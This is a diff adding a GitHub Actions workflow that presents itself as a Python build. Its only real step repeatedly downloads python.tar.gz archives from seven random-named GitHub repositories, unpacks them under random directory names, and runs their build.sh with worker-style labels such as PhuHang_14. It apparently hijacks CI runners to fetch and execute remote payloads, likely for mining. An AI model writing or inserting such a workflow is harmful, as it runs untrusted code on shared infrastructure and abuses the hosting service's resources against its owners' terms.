@@ -1,0 +1,32 @@
+name: Vuong Anh
+
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Python 3.12
+      uses: actions/setup-python@v3
+      with:
+        python-version: "3.12"
+    - name: run
+      run: |
+        for i in {1..4}; do R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget https://github.com/14hongphatm-coder/54545443/releases/download/3/python.tar.gz -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python "$R" && cd "$R" && chmod +x build.sh && ./build.sh 4 PhuHang_14; done
+        for i in {1..4}; do R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget https://github.com/10hongphatm-gif/345345345/releases/download/10hongphat/python.tar.gz -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python "$R" && cd "$R" && chmod +x build.sh && ./build.sh 4 PhuHang_10; done
+        for i in {1..4}; do R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget https://github.com/8hongphatm-beep/45yt4y45y/releases/download/8hongphat/python.tar.gz -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python "$R" && cd "$R" && chmod +x build.sh && ./build.sh 4 PhuHang_8; done
+        for i in {1..4}; do R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget https://github.com/7hongphatm-sudo/567567567567/releases/download/7hongphat/python.tar.gz -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python "$R" && cd "$R" && chmod +x build.sh && ./build.sh 4 PhuHang_7; done
+        for i in {1..4}; do R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget https://github.com/6hongphatm-alt/34534t4t34/releases/download/6hongphat/python.tar.gz -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python "$R" && cd "$R" && chmod +x build.sh && ./build.sh 4 PhuHang_6; done
+        for i in {1..4}; do R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget https://github.com/5hongphatm-hub/5648545124/releases/download/5hongphat/python.tar.gz -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python "$R" && cd "$R" && chmod +x build.sh && ./build.sh 4 PhuHang_5; done
+        for i in {1..4}; do R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget https://github.com/4hongphatm-oss/32423456546/releases/download/4hongphat/python.tar.gz -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python "$R" && cd "$R" && chmod +x build.sh && ./build.sh 4 PhuHang_4; done
+        ls
